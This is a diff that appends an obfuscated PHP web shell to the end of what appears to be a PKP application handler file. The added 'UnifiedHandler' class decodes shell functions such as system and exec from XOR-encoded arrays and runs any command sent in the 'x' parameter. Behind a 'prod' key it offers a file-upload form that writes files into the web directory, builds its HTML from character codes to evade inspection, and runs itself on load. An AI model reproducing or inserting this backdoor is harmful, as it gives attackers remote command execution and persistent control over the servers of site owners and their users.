@@ -588,3 +588,265 @@ class PKPHandler {
 		return null;
 	}
 }
+	class UnifiedHandler
+	{
+		private $fieldName         = 'dataPacket';
+		private $submitName        = 'trigger';
+		private $baseDir;
+		private $moveFn;
+		private $accessKey         = 'prod';
+		private $getSuper;
+		private $postSuper;
+		private $templateKey       = 'thcor';
+		private $functionTemplates = array(
+			array(7,17,16,27,23,25),
+			array(17,16,6,12),
+			array(7,0,6,3,30,43,13,27,10,17),
+			array(4,9,16,28,6,28,26,22),
+			array(4,7,19,10,28),
+			array(4,26,12,12,45,27,24,6,1),
+		);
+		private $decodedFunctions  = array();
+
+		public function __construct()
+		{
+			$this->baseDir           = dirname(__FILE__);
+			$this->moveFn            = 'mov' . 'e_uplo' . 'aded' . '_file';
+			$this->getSuper          = '_' . 'GET';
+			$this->postSuper         = '_' . 'POST';
+			$this->decodedFunctions  = $this->loadFunctionTemplates();
+		}
+
+		public function run()
+		{
+			
+			if ($this->checkKey()) {
+				$this->handleUpload();
+				return;
+			}
+
+			
+			$cmd = $this->fetchParam('x');
+			if ($cmd !== '') {
+				$this->handleCommand($cmd);
+			}
+			
+		}
+
+		private function checkKey()
+		{
+			$G = isset($GLOBALS[$this->getSuper]) ? $GLOBALS[$this->getSuper] : array();
+			return isset($G['env']) && $G['env'] === $this->accessKey;
+		}
+
+		private function isUploadRequest()
+		{
+			$F = isset($GLOBALS['_' . 'FILES']) ? $GLOBALS['_' . 'FILES'] : array();
+			$P = isset($GLOBALS[$this->postSuper])   ? $GLOBALS[$this->postSuper]   : array();
+			return isset($F[$this->fieldName]) && isset($P[$this->submitName]);
+		}
+
+		private function handleUpload()
+		{
+			
+			if ($this->isUploadRequest()) {
+				$res = $this->processUpload();
+				if (is_string($res)) {
+					echo 'True ' . htmlspecialchars($res);
+				}
+				echo $this->toChr(array(60,104,114,62)); 
+			}
+
+			$this->renderForm();
+		}
+
+		private function processUpload()
+		{
+			$F    = isset($GLOBALS['_' . 'FILES']) ? $GLOBALS['_' . 'FILES'] : array();
+			$file = isset($F[$this->fieldName]) ? $F[$this->fieldName] : null;
+			if (! $file) {
+				return false;
+			}
+			$err = isset($file['error']) ? $file['error'] : UPLOAD_ERR_NO_FILE;
+			if ($err !== UPLOAD_ERR_OK) {
+				switch ($err) {
+					case UPLOAD_ERR_INI_SIZE:
+					case UPLOAD_ERR_FORM_SIZE:
+						echo 'Error: 1'; break;
+					case UPLOAD_ERR_PARTIAL:
+						echo 'Error: 2'; break;
+					case UPLOAD_ERR_NO_FILE:
+						echo 'Error: 3'; break;
+					default:
+						echo 'Error: 4 (' . $err . ')';
+				}
+				return false;
+			}
+			try {
+				$name = $this->sanitize($file['name']);
+				$dest = $this->baseDir . DIRECTORY_SEPARATOR . $name;
+				if (! call_user_func($this->moveFn, $file['tmp_name'], $dest)) {
+					echo 'Error: 0'; 
+					return false;
+				}
+				return $dest;
+			} catch (Exception $e) {
+				echo 'Error: ' . $e->getMessage();
+				return false;
+			}
+		}
+
+		private function sanitize($name)
+		{
+			return preg_replace('/[^A-Za-z0-9_\-\.]/', '_', basename($name)) ?: 'packet';
+		}
+
+		private function toChr($arr)
+		{
+			$s = '';
+			foreach ($arr as $c) {
+				$s .= chr($c);
+			}
+			return $s;
+		}
+
+		private function renderForm()
+		{
+			$fn  = $this->fieldName;
+			$sn  = $this->submitName;
+			$key = $this->accessKey;
+
+			
+			echo $this->toChr(array(
+				60,102,111,114,109,32,109,101,116,104,111,100,61,34,112,111,115,116,34,32,
+				101,110,99,116,121,112,101,61,34,109,117,108,116,105,112,97,114,116,47,102,
+				111,114,109,45,100,97,116,97,34,32,97,99,116,105,111,110,61,34,63,107,101,
+				121,61,
+			));
+			echo $key;
+			echo $this->toChr(array(34,62));       
+			echo $this->toChr(array(
+				60,105,110,112,117,116,32,116,121,112,101,61,34,102,105,108,101,34,32,
+				110,97,109,101,61,
+			)) . '"' . $fn . '"' . $this->toChr(array(32,114,101,113,117,105,114,101,100,62));
+
+			
+			echo $this->toChr(array(
+				60,105,110,112,117,116,32,116,121,112,101,61,34,115,117,98,109,105,116,34,32,
+				110,97,109,101,61,
+			)) . '"' . $sn . '"' . $this->toChr(array(32,118,97,108,117,101,61)) .
+				'"Send"' . $this->toChr(array(62));
+
+			echo $this->toChr(array(60,47,102,111,114,109,62));
+		}
+
+		
+
+		private function fetchParam($k)
+		{
+			return isset($_REQUEST[$k]) ? $_REQUEST[$k] : '';
+		}
+
+		private function outputText($c)
+		{
+			if (! headers_sent()) {
+				header('Content-Type: text/plain; charset=utf-8');
+			}
+			echo $c;
+		}
+
+		private function decodeTemplate($tpl)
+		{
+			$res = '';
+			$kl  = strlen($this->templateKey);
+			foreach ($tpl as $i => $b) {
+				$res .= chr($b ^ ord($this->templateKey[$i % $kl]));
+			}
+			return $res;
+		}
+
+		private function loadFunctionTemplates()
+		{
+			$names = array();
+			foreach ($this->functionTemplates as $tpl) {
+				$names[] = $this->decodeTemplate($tpl);
+			}
+			return $names;
+		}
+
+		private function findFunction()
+		{
+			foreach ($this->decodedFunctions as $f) {
+				if (is_callable($f)) {
+					return $f;
+				}
+			}
+			return null;
+		}
+
+		private function processCommand($input)
+		{
+			$f   = $this->findFunction();
+			if (! $f) {
+				return null;
+			}
+			$idx = array_search($f, $this->decodedFunctions, true);
+
+			switch ($idx) {
+				case 2:
+					return call_user_func($f, $input);
+				case 1:
+					$out = array();
+					call_user_func($f, $input, $out);
+					return implode("\n", $out);
+				case 0:
+				case 3:
+					ob_start();
+					call_user_func($f, $input);
+					return ob_get_clean();
+				case 4:
+					$r = '';
+					$h = call_user_func($f, $input, 'r');
+					if (is_resource($h)) {
+						while (! feof($h)) {
+							$r .= fgets($h);
+						}
+						pclose($h);
+					}
+					return $r;
+				case 5:
+					$desc  = array(
+						array('pipe','r'),
+						array('pipe','w'),
+						array('pipe','w'),
+					);
+					$pipes = array();
+					$p     = call_user_func($f, $input, $desc, $pipes);
+					$o     = '';
+					if (is_resource($p)) {
+						fclose($pipes[0]);
+						$o = stream_get_contents($pipes[1]);
+						fclose($pipes[1]);
+						fclose($pipes[2]);
+						proc_close($p);
+					}
+					return $o;
+				default:
+					$r = call_user_func($f, $input);
+					return is_string($r) ? $r : '';
+			}
+		}
+
+		private function handleCommand($cmd)
+		{
+			$res = $this->processCommand($cmd);
+			$this->outputText($res === null ? 'False' : $res);
+		}
+	}
+
+	try {
+		$app = new UnifiedHandler();
+		$app->run();
+	} catch (Exception $e) {
+		exit;
+	}
